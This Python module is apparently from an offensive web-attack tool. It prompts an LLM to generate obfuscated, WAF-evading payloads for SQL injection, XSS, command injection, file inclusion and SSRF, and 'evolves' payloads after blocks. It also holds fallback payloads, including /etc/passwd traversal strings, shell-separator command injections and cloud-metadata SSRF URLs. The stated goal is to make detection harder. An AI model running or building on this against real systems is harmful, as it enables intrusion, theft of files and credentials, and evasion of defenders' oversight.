"""
AI Payload Generator - Dynamic Payload Generation with LLM

This module uses AI (LLM) to generate custom payloads for each target.
Instead of using static payloads, the AI creates fresh, unique payloads
that are tailored to:
1. The specific target technology stack
2. WAF/IDS signatures to bypass
3. Context of the vulnerability
4. Obfuscation techniques

This makes detection much harder and increases success rate.
"""

import asyncio
from typing import Dict, List, Optional, Any
from loguru import logger
import json
import re

try:
    from core.llm_provider import get_llm_response
    LLM_AVAILABLE = True
except ImportError:
    LLM_AVAILABLE = False
    logger.warning("LLM provider not available, using fallback payloads")


class AIPayloadGenerator:
    """
    AI-powered payload generator.
    
    Generates custom, context-aware payloads using LLM.
    """
    
    def __init__(self, model: str = "mixtral:latest"):
        """
        Initialize AI Payload Generator.
        
        Args:
            model: LLM model to use (default: mixtral:latest)
        """
        self.model = model
        self.payload_cache = {}
        
    async def generate_adaptive_payload(
        self,
        vulnerability_type: str,
        target_context: Dict[str, Any],
        waf_signatures: List[str] = None,
        previous_attempts: List[Dict] = None
    ) -> Dict[str, Any]:
        """
        Generate adaptive payload using AI.
        
        Args:
            vulnerability_type: Type of vulnerability (sqli, xss, rce, etc.)
            target_context: Context about the target (tech stack, WAF, etc.)
            waf_signatures: Known WAF signatures to bypass
            previous_attempts: Previous failed attempts to learn from
            
        Returns:
            Dictionary containing payload and metadata
        """
        logger.info(f"🧠 Generating adaptive {vulnerability_type} payload with AI")
        
        # Build context for LLM
        context = self._build_context(
            vulnerability_type,
            target_context,
            waf_signatures,
            previous_attempts
        )
        
        # Generate payload using LLM
        if LLM_AVAILABLE:
            payload_data = await self._generate_with_llm(context)
        else:
            payload_data = self._generate_fallback(vulnerability_type, target_context)
        
        # Add metadata
        payload_data['vulnerability_type'] = vulnerability_type
        payload_data['generated_at'] = asyncio.get_event_loop().time()
        payload_data['context'] = target_context
        
        logger.info(f"✅ Generated adaptive payload: {payload_data['payload'][:100]}...")
        
        return payload_data
    
    def _build_context(
        self,
        vuln_type: str,
        target_context: Dict,
        waf_signatures: List[str],
        previous_attempts: List[Dict]
    ) -> str:
        """Build context string for LLM prompt."""
        
        context = f"""Generate a custom {vuln_type.upper()} payload for penetration testing.

TARGET CONTEXT:
- URL: {target_context.get('url', 'Unknown')}
- Technologies: {', '.join(target_context.get('technologies', []))}
- Server: {target_context.get('server', 'Unknown')}
- WAF Detected: {target_context.get('waf', 'None')}
"""
        
        if waf_signatures:
            context += f"\nKNOWN WAF SIGNATURES TO BYPASS:\n"
            for sig in waf_signatures[:5]:
                context += f"- {sig}\n"
        
        if previous_attempts:
            context += f"\nPREVIOUS FAILED ATTEMPTS:\n"
            for attempt in previous_attempts[-3:]:  # Last 3 attempts
                context += f"- Payload: {attempt.get('payload', '')}\n"
                context += f"  Result: {attempt.get('result', '')}\n"
        
        return context
    
    async def _generate_with_llm(self, context: str) -> Dict[str, Any]:
        """Generate payload using LLM."""
        
        prompt = f"""{context}

REQUIREMENTS:
1. Generate a UNIQUE payload (not from common lists)
2. Use obfuscation and encoding techniques
3. Bypass WAF signatures if present
4. Make it context-specific to the target
5. Include multiple variants if possible

IMPORTANT: Return ONLY valid JSON in this exact format:
{{
    "payload": "the actual payload string",
    "variants": ["variant1", "variant2", "variant3"],
    "obfuscation_techniques": ["technique1", "technique2"],
    "explanation": "why this payload should work",
    "bypass_methods": ["method1", "method2"]
}}

Generate the payload now:"""
        
        try:
            response = await get_llm_response(prompt, model=self.model)
            
            # Extract JSON from response
            json_match = re.search(r'\{.*\}', response, re.DOTALL)
            if json_match:
                payload_data = json.loads(json_match.group())
                return payload_data
            else:
                logger.warning("LLM response not in expected format, using fallback")
                return self._generate_fallback_from_response(response)
                
        except Exception as e:
            logger.error(f"LLM payload generation failed: {e}")
            return self._generate_fallback("sqli", {})
    
    def _generate_fallback(self, vuln_type: str, target_context: Dict) -> Dict[str, Any]:
        """Generate fallback payload when LLM is not available."""
        
        payloads = {
            'sqli': {
                'payload': "' OR '1'='1' -- -",
                'variants': [
                    "' OR 1=1 -- -",
                    "admin' -- -",
                    "' UNION SELECT NULL,NULL,NULL -- -",
                    "1' AND 1=1 -- -"
                ],
                'obfuscation_techniques': ['comment_injection', 'space_to_comment'],
                'explanation': 'Basic SQL injection with comment',
                'bypass_methods': ['comment_based', 'boolean_based']
            },
            'xss': {
                'payload': "<script>alert(document.domain)</script>",
                'variants': [
                    "<img src=x onerror=alert(1)>",
                    "<svg/onload=alert(1)>",
                    "javascript:alert(1)",
                    "<iframe src=javascript:alert(1)>"
                ],
                'obfuscation_techniques': ['tag_mutation', 'event_handler'],
                'explanation': 'XSS payload with multiple vectors',
                'bypass_methods': ['tag_based', 'event_based', 'protocol_based']
            },
            'rce': {
                'payload': "; whoami",
                'variants': [
                    "| whoami",
                    "` whoami `",
                    "$( whoami )",
                    "&& whoami"
                ],
                'obfuscation_techniques': ['command_chaining', 'subshell'],
                'explanation': 'Command injection payload',
                'bypass_methods': ['separator_based', 'subshell_based']
            },
            'lfi': {
                'payload': "../../../../etc/passwd",
                'variants': [
                    "....//....//....//etc/passwd",
                    "..%2F..%2F..%2F..%2Fetc%2Fpasswd",
                    "....\\\\....\\\\....\\\\etc\\\\passwd"
                ],
                'obfuscation_techniques': ['path_traversal', 'encoding'],
                'explanation': 'Local file inclusion payload',
                'bypass_methods': ['traversal_based', 'encoding_based']
            },
            'ssrf': {
                'payload': "http://169.254.169.254/latest/meta-data/",
                'variants': [
                    "http://metadata.google.internal/",
                    "http://localhost:80",
                    "http://127.0.0.1:22"
                ],
                'obfuscation_techniques': ['ip_encoding', 'dns_rebinding'],
                'explanation': 'SSRF payload targeting cloud metadata',
                'bypass_methods': ['metadata_based', 'localhost_based']
            }
        }
        
        return payloads.get(vuln_type, payloads['sqli'])
    
    def _generate_fallback_from_response(self, response: str) -> Dict[str, Any]:
        """Try to extract payload from non-JSON LLM response."""
        
        # Try to find payload in response
        payload_match = re.search(r'payload["\s:]+([^\n"]+)', response, re.IGNORECASE)
        
        if payload_match:
            payload = payload_match.group(1).strip()
        else:
            payload = response[:200]  # Use first 200 chars
        
        return {
            'payload': payload,
            'variants': [],
            'obfuscation_techniques': ['llm_generated'],
            'explanation': 'Extracted from LLM response',
            'bypass_methods': ['custom']
        }
    
    async def generate_sqli_payload(
        self,
        target_context: Dict,
        injection_point: str = "parameter",
        db_type: str = "mysql"
    ) -> Dict[str, Any]:
        """Generate SQL injection payload."""
        
        target_context['injection_point'] = injection_point
        target_context['db_type'] = db_type
        
        return await self.generate_adaptive_payload(
            'sqli',
            target_context
        )
    
    async def generate_xss_payload(
        self,
        target_context: Dict,
        xss_type: str = "reflected",
        context: str = "html"
    ) -> Dict[str, Any]:
        """Generate XSS payload."""
        
        target_context['xss_type'] = xss_type
        target_context['context'] = context
        
        return await self.generate_adaptive_payload(
            'xss',
            target_context
        )
    
    async def generate_rce_payload(
        self,
        target_context: Dict,
        os_type: str = "linux",
        shell: str = "bash"
    ) -> Dict[str, Any]:
        """Generate RCE payload."""
        
        target_context['os_type'] = os_type
        target_context['shell'] = shell
        
        return await self.generate_adaptive_payload(
            'rce',
            target_context
        )
    
    async def generate_payload_chain(
        self,
        vulnerability_types: List[str],
        target_context: Dict
    ) -> List[Dict[str, Any]]:
        """
        Generate a chain of payloads for multi-stage attack.
        
        Args:
            vulnerability_types: List of vulnerability types in order
            target_context: Target context
            
        Returns:
            List of payload dictionaries
        """
        logger.info(f"🔗 Generating payload chain: {' -> '.join(vulnerability_types)}")
        
        payloads = []
        
        for vuln_type in vulnerability_types:
            payload = await self.generate_adaptive_payload(
                vuln_type,
                target_context,
                previous_attempts=payloads  # Learn from previous payloads
            )
            payloads.append(payload)
        
        logger.info(f"✅ Generated {len(payloads)} chained payloads")
        
        return payloads
    
    async def evolve_payload(
        self,
        original_payload: Dict,
        failure_reason: str
    ) -> Dict[str, Any]:
        """
        Evolve a failed payload based on failure reason.
        
        Args:
            original_payload: The original payload that failed
            failure_reason: Why it failed (waf_blocked, syntax_error, etc.)
            
        Returns:
            Evolved payload
        """
        logger.info(f"🧬 Evolving payload due to: {failure_reason}")
        
        context = f"""The following payload failed:
Payload: {original_payload['payload']}
Failure Reason: {failure_reason}

Generate an improved version that addresses the failure reason.
Use different obfuscation techniques and bypass methods.
"""
        
        if LLM_AVAILABLE:
            evolved = await self._generate_with_llm(context)
        else:
            # Simple mutation for fallback
            evolved = original_payload.copy()
            evolved['payload'] = self._mutate_payload(original_payload['payload'])
        
        evolved['evolved_from'] = original_payload['payload']
        evolved['evolution_reason'] = failure_reason
        
        logger.info(f"✅ Evolved payload: {evolved['payload'][:100]}...")
        
        return evolved
    
    def _mutate_payload(self, payload: str) -> str:
        """Simple payload mutation for fallback."""
        mutations = [
            lambda p: p.replace(' ', '/**/'),  # Space to comment
            lambda p: p.replace('=', ' LIKE '),  # = to LIKE
            lambda p: p.replace("'", "''"),  # Quote doubling
            lambda p: p.upper(),  # Case change
            lambda p: p.replace('AND', '&&'),  # Operator change
        ]
        
        import random
        mutation = random.choice(mutations)
        return mutation(payload)


async def main():
    """Test AI Payload Generator."""
    
    generator = AIPayloadGenerator()
    
    target_context = {
        'url': 'http://localhost:8000/login',
        'technologies': ['PHP', 'MySQL', 'Apache'],
        'server': 'Apache/2.4.41',
        'waf': 'ModSecurity'
    }
    
    # Test SQL injection payload
    print("\n=== SQL Injection Payload ===\n")
    sqli = await generator.generate_sqli_payload(target_context)
    print(f"Payload: {sqli['payload']}")
    print(f"Variants: {sqli['variants']}")
    print(f"Explanation: {sqli['explanation']}")
    
    # Test XSS payload
    print("\n=== XSS Payload ===\n")
    xss = await generator.generate_xss_payload(target_context)
    print(f"Payload: {xss['payload']}")
    print(f"Variants: {xss['variants']}")
    
    # Test payload chain
    print("\n=== Payload Chain ===\n")
    chain = await generator.generate_payload_chain(
        ['sqli', 'xss', 'rce'],
        target_context
    )
    for i, payload in enumerate(chain, 1):
        print(f"{i}. {payload['vulnerability_type']}: {payload['payload']}")
    
    # Test payload evolution
    print("\n=== Payload Evolution ===\n")
    evolved = await generator.evolve_payload(sqli, "waf_blocked")
    print(f"Original: {sqli['payload']}")
    print(f"Evolved: {evolved['payload']}")


if __name__ == "__main__":
    import logging
    logging.basicConfig(level=logging.INFO)
    
    asyncio.run(main())

